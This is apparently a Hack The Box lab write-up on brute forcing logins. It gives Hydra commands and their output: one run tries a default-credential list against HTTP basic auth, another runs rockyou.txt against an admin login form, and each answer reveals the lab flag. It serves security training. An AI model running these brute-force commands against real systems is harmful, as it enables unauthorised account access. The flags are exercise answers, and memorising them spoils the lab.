# Question

```
 When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.
```

## Code
```
hydra -C ftp-better-defaultpasslist.txt 188.166.173.208 -s 30016 http-get /

Result:
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-27 16:42:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://188.166.173.208:30016/
[30016][http-get] host: 188.166.173.208   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-27 16:42:43

```

## Answer
```
HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}
```

# Question
```
Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?
```

# Code
```
hydra -l user -P rockyou.txt -f 188.166.173.208 -s 30016 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"

Result:
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-27 17:03:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 513 login tries (l:1/p:513), ~33 tries per task
[DATA] attacking http-post-form://188.166.173.208:30016/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'
[30016][http-post-form] host: 188.166.173.208   login: user   password: harrypotter
[STATUS] attack finished for 188.166.173.208 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-27 17:04:27


```

# Answer
```
HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!}
```
